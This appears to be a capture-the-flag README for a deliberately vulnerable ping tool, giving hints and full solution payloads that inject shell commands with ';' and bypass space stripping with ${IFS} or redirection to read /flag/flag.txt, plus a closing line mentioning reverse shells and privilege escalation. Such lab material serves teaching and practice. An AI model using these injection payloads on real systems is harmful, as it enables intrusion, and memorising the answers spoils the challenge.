# Crystal Ping — Command Injection

## Overview
This challenge simulates a **network diagnostic tool** that allows users to ping a host.  
Behind the scenes, user input is passed unsafely to a shell command, creating a **command injection vulnerability**.

---

## What Is Allowed
The application intentionally restricts input to make exploitation less trivial:

- **All whitespace is removed**
- **Input length is limited**
- Only a **small allowlist of commands** is accepted after injection

Specifically allowed:
- `ls` (for reconnaissance)
- `head` or `tail` (to read the flag)
- Space bypass via `${IFS}` or input redirection `<`d
- not "cat"

---

## Goal
Find and read the flag located at:

**/flag/flag.txt**


---

## Hints

#### - A semicolon (`;`) can terminate the ping command
#### - Spaces do not work — you need a workaround
#### - You don’t need full file output; partial output is enough
#### - "cat" doesnt work, but parts of a "cat" like "head" or "tail" do work

- 8.8.8.8;head</flag/flag.txt
- 8.8.8.8;tail</flag/flag.txt
- 8.8.8.8;head${IFS}/flag/flag.txt
- 8.8.8.8;tail${IFS}/flag/flag.txt

### Recon directory:
8.8.8.8;ls${IFS}/
8.8.8.8;ls${IFS}/flag

### What will **NOT** work (by design)

- 8.8.8.8;cat/flag/flag.txt     # cat not allowlisted
- 8.8.8.8;cat</flag/flag.txt    # cat blocked
- 8.8.8.8;ls/                   # ls/ is treated as a command name
- 8.8.8.8;sed1q</flag/flag.txt  # sed not allowlisted
- 8.8.8.8;head /flag/flag.txt   # spaces stripped
---

## Example Strategy
1. Inject a second command using `;`
2. Use `ls` to discover directories
3. Read the flag using `head` or `tail` with a space bypass

---

## Learning Objective
Understand how **input sanitization mistakes** and **partial allowlists** still lead to real-world command injection vulnerabilities.

Probeert REverse shell, privilege escalation